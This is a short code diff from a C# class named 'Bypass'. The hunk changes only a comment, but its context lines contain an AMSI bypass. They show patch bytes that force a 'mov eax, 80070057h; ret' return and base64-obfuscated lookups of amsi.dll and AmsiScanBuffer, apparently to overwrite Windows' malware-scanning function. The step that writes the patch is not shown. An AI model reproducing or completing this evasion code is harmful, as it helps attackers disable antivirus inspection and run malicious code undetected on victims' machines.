@@ -22,7 +22,7 @@ public class Bypass
     public static void amsi()
     {
         byte[] patchBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 80070057h
-                                                                               // retn
+                                                                               // return
         var lib = LoadLibrary(Base64Decode("YW1zaS5kbGw=")); //amsi.dll
         var addr = GetProcAddress(lib, Base64Decode("QW1zaVNjYW5CdWZmZXI=")); //AmsiScanBuffer
 
